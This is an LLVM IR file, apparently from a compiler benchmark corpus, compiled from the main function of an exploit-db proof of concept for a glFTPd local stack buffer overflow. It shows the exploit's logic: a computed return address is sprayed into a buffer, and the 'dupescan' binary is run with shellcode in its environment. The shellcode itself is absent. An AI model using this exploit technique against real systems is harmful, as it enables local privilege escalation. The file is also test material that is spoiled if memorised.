; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_476.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_476.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@shellcode = common dso_local global i8* null, align 8
@BUFFER = common dso_local global i32 0, align 4
@PATH = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [56 x i8] c" glFTPd local stack buffer overflow (Proof of Concept) \00", align 1
@.str.1 = private unnamed_addr constant [10 x i8] c" by CoKi \00", align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"dupescan\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [3 x i8*], align 16
  %3 = alloca i8*, align 8
  %4 = alloca i64, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %9 = getelementptr inbounds [3 x i8*], [3 x i8*]* %2, i64 0, i64 0
  %10 = load i8*, i8** @shellcode, align 8
  store i8* %10, i8** %9, align 8
  %11 = getelementptr inbounds i8*, i8** %9, i64 1
  store i8* null, i8** %11, align 8
  %12 = getelementptr inbounds i8*, i8** %11, i64 1
  %13 = getelementptr inbounds i8*, i8** %9, i64 3
  br label %14

14:                                               ; preds = %14, %0
  %15 = phi i8** [ %12, %0 ], [ %16, %14 ]
  store i8* null, i8** %15, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 1
  %17 = icmp eq i8** %16, %13
  br i1 %17, label %18, label %14

18:                                               ; preds = %14
  %19 = load i32, i32* @BUFFER, align 4
  %20 = zext i32 %19 to i64
  %21 = call i8* @llvm.stacksave()
  store i8* %21, i8** %3, align 8
  %22 = alloca i8, i64 %20, align 16
  store i64 %20, i64* %4, align 8
  %23 = bitcast i8* %22 to i32*
  store i32* %23, i32** %6, align 8
  %24 = load i8*, i8** @shellcode, align 8
  %25 = call i32 @strlen(i8* %24)
  %26 = sub i32 -1073741830, %25
  %27 = load i8*, i8** @PATH, align 8
  %28 = call i32 @strlen(i8* %27)
  %29 = sub i32 %26, %28
  store i32 %29, i32* %8, align 4
  store i32 0, i32* %7, align 4
  br label %30

30:                                               ; preds = %38, %18
  %31 = load i32, i32* %7, align 4
  %32 = load i32, i32* @BUFFER, align 4
  %33 = icmp sle i32 %31, %32
  br i1 %33, label %34, label %41

34:                                               ; preds = %30
  %35 = load i32, i32* %8, align 4
  %36 = load i32*, i32** %6, align 8
  %37 = getelementptr inbounds i32, i32* %36, i32 1
  store i32* %37, i32** %6, align 8
  store i32 %35, i32* %36, align 4
  br label %38

38:                                               ; preds = %34
  %39 = load i32, i32* %7, align 4
  %40 = add nsw i32 %39, 4
  store i32 %40, i32* %7, align 4
  br label %30

41:                                               ; preds = %30
  %42 = call i32 @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str, i64 0, i64 0))
  %43 = call i32 @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0))
  %44 = load i8*, i8** @PATH, align 8
  %45 = getelementptr inbounds [3 x i8*], [3 x i8*]* %2, i64 0, i64 0
  %46 = call i32 @execle(i8* %44, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0), i8* %22, i32* null, i8** %45)
  %47 = load i8*, i8** %3, align 8
  call void @llvm.stackrestore(i8* %47)
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @printf(i8*) #2

declare dso_local i32 @execle(i8*, i8*, i8*, i32*, i8**) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
